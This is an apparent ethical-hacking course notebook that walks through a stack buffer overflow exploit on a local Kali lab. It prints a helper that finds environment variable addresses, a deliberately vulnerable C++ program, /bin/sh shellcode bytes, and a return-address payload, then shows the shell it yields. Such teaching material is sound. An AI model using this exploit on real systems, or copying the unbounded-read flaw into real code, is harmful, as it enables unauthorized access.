# Stack Overflow - Exploiting with Env Variable

- often times buffer that has overflow vulnerability is not large enough to fit even the smallest shellcode
- in sitation like this, one can stash the shellcode as an environment variable and overwrite the caller's return address with the address of the shellcode stored in environment variable
- environment variables are loaded into the memory everytime a program is loaded into memory bydefault
- one can also execute program without loading the environment variable, however
- **env -i ./program** command, e.g., ignores environment variable when running a program
- let's look at how we can programmatically find the address of environment variables using C++
- C stanard library's **getenv()** accepts the name of an environment variable as its only argument and returns that variable's memory address
- **getenvaddr.cpp** demo provides fairly accurate location by accounting for the length of the target program's name that's also loaded on stack


```python
! cat ./demos/stack_overflow/getenvaddr.cpp
```

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
        char *ptr;
    
        if(argc < 3) {
            printf("Usage: %s <env variable name> <target program name>\n", argv[0]);
        }
        else {
            ptr = getenv(argv[1]); /* get env var location */
            int diff = (strlen(argv[0]) - strlen(argv[2]))*2;
            ptr += diff; /* adjust for program name */
            printf("%s will be at %p with reference to %s\n", argv[1], ptr, argv[2]);
        }
        return 0;
    }



```bash
%%bash
input="./demos/stack_overflow/getenvaddr.cpp"
output=getenvaddr.exe

echo kali | sudo -S ./compile.sh $input $output
```

    [sudo] password for kali: 


```python
! ./getenvaddr.exe
```

    Usage: ./getenvaddr.exe <env variable name> <target program name>



```python
! ./getenvaddr.exe PATH ./getenvaddr.exe
```

    PATH will be at 0xffffc794 with reference to ./getenvaddr.exe


### Note
- the `./getenvaddr.exe` program provides different address when the above command is directly executed from the terminal compared to running it from the Jupyter notebook
- the address retrieved from the terminal is the one we need as we'll be exploiting the program directly from terminal and not from the Jupyter notebook!
- the following snippet shows the PATH address when executed from the terminal

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ ./getenvaddr.exe PATH ./getenvaddr.exe
PATH will be at 0xffffc80a with reference to ./getenvaddr.exe
```

### Export shellcode
- let's copy `shellcode.bin` from the `demos/shellcode` folder and export it as an environment variable

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ cp ./demos/shellcode/shellcode.bin .

┌──(kali㉿K)-[~/EthicalHacking]
└─$ wc -c shellcode.bin 
24 shellcode.bin

┌──(kali㉿K)-[~/EthicalHacking]
└─$ export SHELLCODE=$(cat shellcode.bin)
                                                                                                                  
┌──(kali㉿K)-[~/EthicalHacking]
└─$ echo $SHELLCODE | hexdump -C         
00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|
00000010  c9 89 ca 6a 0b 58 cd 80  0a                       |...j.X...|
00000019

```

### Expoit so_env.cpp
- let's copy and compile the file and exploit it using the shellcode stashed in environment variable
- the program has buffer size of 16 bytes which is not big enough to hold our 24 bytes shellcode


```python
! cat ./demos/stack_overflow/so_env.cpp
```

    #include <cstring>
    #include <iostream>
    
    using namespace std;
    
    char * mgets(char *dst) {
        char *ptr = dst;
        int ch; 
    	/* skip leading white spaces */ 
        while ((ch = getchar()) && (ch == ' ' or ch == '\t')) 
            ; 
    
        if ((ch == '\n') or (ch == EOF)) { 
            *ptr = '\0';
            return dst; 
        } 
        else
            *ptr = ch;
    
        /* now read the rest until \n or EOF */ 
        while (ch = getchar()) {
            if (ch == '\n' or ch == EOF) break;
            *(++ptr) = ch; 
        }
        *(++ptr) = 0;
        return dst;
    }
    
    void bad() {
        char buffer[16];
        cout << "Enter text: ";
        mgets(buffer);
        cout << "text = " << buffer << endl;
    }
    
    int main(int argc, char *argv[]) {
        //char *ptr;
        //ptr = getenv("SHELLCODE");
        //printf("SHELLCODE is at %p\n", ptr);
        bad();
        cout << "Good bye!\n";
        return 0;
    }
    	



```bash
%%bash
input="./demos/stack_overflow/so_env.cpp"
output="so_env.exe"

echo kali | sudo -S ./compile.sh $input $output
```

    [sudo] password for kali: 

### crash the program


```python
! python -c 'print("A"*10)' | ./so_env.exe
```

    Enter text: text = AAAAAAAAAA
    Good bye!



```python
! python -c 'print("A"*30)' | ./so_env.exe
```

    Enter text: text = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


- first, find the address of `SHELLCODE` environment variable with respect to `so_env.exe`
- repeat the address of `SHELLCODE` enough to overwrite the caller's return address in `bad()`
- VOILA!

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ ./getenvaddr.exe SHELLCODE ./so_env.exe            
SHELLCODE will be at 0xffffdfa9 with reference to ./so_env.exe
```
- since the program recieves the data from standard input, we'll create a payload file with the repeated SHELLCODE address (little endian)


```python
! python -c 'import sys; sys.stdout.buffer.write(b"\xa9\xdf\xff\xff"*20)' > payload_env.bin
```


```python
! wc -c payload_env.bin
```

    80 payload_env.bin


- now that the payload_env.txt is created we'll pipe it to the program as stdio

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ cat payload_env.bin - | ./so_env.exe    

Enter text: text = ��������������������������������������������������������������������������������
whoami
kali
date
Thu Dec 17 00:26:43 MST 2020
exit

```
- the shellcode doesn't provide the prompt and you have to hit enter on a blank line to end the stdandard input buffer


```python

```
